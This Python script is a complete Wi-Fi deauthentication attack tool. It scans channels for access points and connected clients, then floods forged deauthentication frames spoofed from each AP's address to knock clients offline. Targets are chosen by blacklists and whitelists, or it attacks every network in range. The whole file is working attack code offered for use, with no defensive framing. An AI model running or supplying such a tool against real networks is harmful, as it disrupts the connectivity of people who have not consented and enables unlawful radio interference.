import argparse
import subprocess
import time
import sys
import os
from typing import List, Tuple, Dict
from collections import defaultdict
from loguru import logger
from scapy.all import sniff, sendp
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
import concurrent.futures

# Constants
INTERFACE_MONITOR_1 = "wlan1"
INTERFACE_MONITOR_2 = "wlan2"

# Remove default handler and configure loguru to log to stdout
DEBUG = os.getenv('DEBUG', 'False') == 'True'
log_level = "DEBUG" if DEBUG else "INFO"
logger.remove()
logger.add(sys.stdout, format="{time} - {level} - {message}", level=log_level)


# Shared dictionary for targets
targets_dict: Dict[str, Tuple[str, List[str], int]] = defaultdict(lambda: ("", [], 0))


def lower_case(value):
    """
    Custom type function to convert input MAC addresses or SSIDs to lowercase.
    Handles individual string inputs and ensures they are stripped of whitespace
    and converted to lowercase.
    """
    if isinstance(value, str):
        return value.strip().lower()
        # return [v.strip().lower() for v in value.split(',') if v.strip()]
    else:
        raise argparse.ArgumentTypeError("Argument must be a string.")


# Initialize arguments
parser = argparse.ArgumentParser(description="Deauth unwanted users from Wi-Fi network.")
parser.add_argument("--deauth_reasons", nargs='+', default=[1, 2, 3, 4, 6, 7, 8, 10], help="List of deauth codes to be sent sequentially to the target. Default all.")
parser.add_argument("--deauth_seq", type=int, default=50, help="Number of packets for each reason to be sent at once.")
parser.add_argument("--whitelist_ap", type=lower_case, nargs='+', default=[], help="Ignore these ESSID or BSSID APs from attacking.")
parser.add_argument("--whitelist_client", type=lower_case, nargs='+', default=[], help="Ignore these clients from attacking.")
parser.add_argument("--blacklist_ap", type=lower_case, nargs='+', default=[], help="List of ESSID or BSSID AP targets.")
parser.add_argument("--blacklist_client", type=lower_case, nargs='+', default=[], help="List of client targets.")
parser.add_argument("--attack_all_ap", action='store_true', help="Allows to use empty blacklist lists and attacks all found AP, except for whitelist.")
parser.add_argument("--attack_all_client", action='store_true', help="Allows to use empty blacklist lists and attacks all found Clients, except for whitelist.")
parser.add_argument("--channel_list", nargs='+', default=list(range(1, 14)) + list(range(36, 165, 4)), help="Channels to hop. Default includes all 2.4GHz and 5GHz channels.")
parser.add_argument("--scan_wait", type=int, default=10, help="For how long to scan")
args = parser.parse_args()


def set_monitor_mode(interface: str) -> None:
    """
    Sets the specified wireless interface to monitor mode.
    
    :param interface: The name of the wireless interface.
    """
    try:
        logger.info(f"Setting {interface} to monitor mode")
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to set monitor mode on {interface}: {e}")


def set_channel(interface: str, channel: int) -> None:
    """
    Sets the specified wireless interface to the given channel.
    
    :param interface: The name of the wireless interface.
    :param channel: The channel number to set.
    """
    try:
        logger.debug(f"Setting {interface} to channel {channel}")
        subprocess.run(["iwconfig", interface, "channel", str(channel)], check=True)
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to set channel {channel} on {interface}: {e}")


def scan_networks(interface: str, scan_wait: int, channel: int) -> None:
    """Scans for networks and connected clients on the specified interface and updates the shared dictionary."""
    global targets_dict

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and (pkt.subtype == 8 or pkt.subtype == 5):  # Beacon or Probe Response
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else ""
                bssid = pkt.addr2.lower() if pkt.addr2 else ''
                # channel = int(ord(pkt[Dot11Elt:3].info)) if pkt.haslayer(Dot11Elt) else 0

                if bssid: # and channel:
                    if bssid not in targets_dict:
                        targets_dict[bssid] = (ssid, [], channel)
            elif pkt.type == 0 and pkt.subtype in {0, 2}:  # Association Request, Reassociation Request
                bssid = pkt.addr1.lower() if pkt.addr1 else ''
                client = pkt.addr2.lower() if pkt.addr2 else ''
                if bssid in targets_dict and client not in targets_dict[bssid][1]:
                    targets_dict[bssid][1].append(client)
            elif pkt.type == 2:  # Data frames
                bssid = pkt.addr1.lower() if pkt.addr1 else ''
                client = pkt.addr2.lower() if pkt.addr2 and pkt.addr2 != bssid else ''
                if bssid in targets_dict and client and client not in targets_dict[bssid][1]:
                    targets_dict[bssid][1].append(client)

    try:
        logger.info(f"Scanning networks on {interface} for {scan_wait} seconds...")
        sniff(iface=interface, prn=packet_handler, timeout=scan_wait, store=0)
        logger.debug(f"targets_dict: {targets_dict}")
    except Exception as e:
        logger.error(f"Error while scanning networks: {e}")


def create_deauth_packet(target: str, bssid: str, reason: int) -> RadioTap:
    """
    Creates a deauthentication packet.
    
    :param target: target MAC address (client to deauth).
    :param bssid: BSSID of the AP (used as source).
    :param reason: Reason code for the deauth.
    :return: The created deauthentication packet.
    """
    dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=reason)
    return packet


def send_deauth_packets(interface: str, target: str, bssid: str, reasons: List[int], seq: int, inter: float = 0.005, verbose: int = 0) -> None:
    """
    Sends deauthentication packets to the target.
    
    :param interface: The name of the wireless interface.
    :param target: The target MAC address to deauth.
    :param bssid: The BSSID of the AP.
    :param reasons: List of reason codes to be sent.
    :param seq: Number of packets for each reason to be sent at once.
    :param inter: Interval between packets (in seconds).
    :param verbose: Verbose level for packet sending.
    """
    # Validate MAC addresses
    valid_mac = lambda mac: len(mac) == 17 and all(c in "0123456789abcdef:" for c in mac.lower())
    if not valid_mac(target) or not valid_mac(bssid):
        logger.error(f"Invalid MAC address format. Target: {target}, BSSID: {bssid}")
        return

    try:
        for reason in reasons:
            packet = create_deauth_packet(target=target, bssid=bssid, reason=reason)
            sendp(packet, iface=interface, count=seq, inter=inter, verbose=verbose)
            logger.debug(f"Sent deauth packets to {target} from BSSID {bssid} with reason {reason}")
    except Exception as e:
        logger.error(f"Error while sending deauth packets: {e}")


def scanning_task() -> None:
    """Scanning task to be run by thread 1"""
    while True:
        for channel in args.channel_list:
            logger.info(f"Scanning on channel {channel}")
            set_channel(INTERFACE_MONITOR_1, channel)
            scan_networks(INTERFACE_MONITOR_1, args.scan_wait, channel)


def attacking_task() -> None:
    """Attacking task to be run by thread 2"""
    while True:
        for bssid, (ssid, clients, channel) in list(targets_dict.items()):
            logger.debug(f"Checking AP SSID:{ssid} BSSID:{bssid} on channel {channel} with clients {clients}")
            # Skip if there is no clients on AP
            if not clients: 
                # logger.debug(f"No clients on AP SSID:{ssid} BSSID:{bssid}")
                continue
            # Skip if AP is whitelisted
            if bssid.lower()in args.whitelist_ap or ssid.lower()in args.whitelist_ap:
                logger.info(f"AP SSID:{ssid} BSSID:{bssid} is in whitelist")
                continue
            # Attack if attack_all_ap or blacklisted
            if args.attack_all_ap or bssid.lower()in args.blacklist_ap or ssid.lower()in args.blacklist_ap:
                logger.warning(f"Attacking clients on BSSID:{bssid} SSID:{ssid} on channel:{channel}")
                set_channel(INTERFACE_MONITOR_2, channel)
                for client in clients:
                    # Skip if Client is whitelisted
                    if client.lower()in args.whitelist_client:
                        logger.info(f"Client:{client} is in whitelist")
                        continue
                    # Attack if attack_all_client or blacklisted
                    if args.attack_all_client or client.lower()in args.blacklist_client:
                        logger.warning(f"Deauthing client:{client} from BSSID:{bssid} SSID:{ssid} channel:{channel}")
                        send_deauth_packets(INTERFACE_MONITOR_2, target=client, bssid=bssid, reasons=args.deauth_reasons, seq=args.deauth_seq)


def main() -> None:
    """Entry point for the script. Sets up interfaces and starts the scanning and attack tasks."""
    try:
        logger.info("Setting interfaces to monitor mode")
        set_monitor_mode(INTERFACE_MONITOR_1)
        set_monitor_mode(INTERFACE_MONITOR_2)

        # Start the scanning and attacking tasks with concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            executor.submit(scanning_task)
            executor.submit(attacking_task)

    except KeyboardInterrupt:
        logger.info("Interrupted by user, shutting down...")
    except Exception as e:
        logger.error(f"An error occurred: {e}")
    finally:
        logger.info("Restoring network interfaces...")
        try:
            subprocess.run(["ifconfig", INTERFACE_MONITOR_1, "down"], check=True)
            subprocess.run(["iwconfig", INTERFACE_MONITOR_1, "mode", "managed"], check=True)
            subprocess.run(["ifconfig", INTERFACE_MONITOR_1, "up"], check=True)
            subprocess.run(["ifconfig", INTERFACE_MONITOR_2, "down"], check=True)
            subprocess.run(["iwconfig", INTERFACE_MONITOR_2, "mode", "managed"], check=True)
            subprocess.run(["ifconfig", INTERFACE_MONITOR_2, "up"], check=True)
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to restore network interfaces: {e}")

if __name__ == "__main__":
    main()
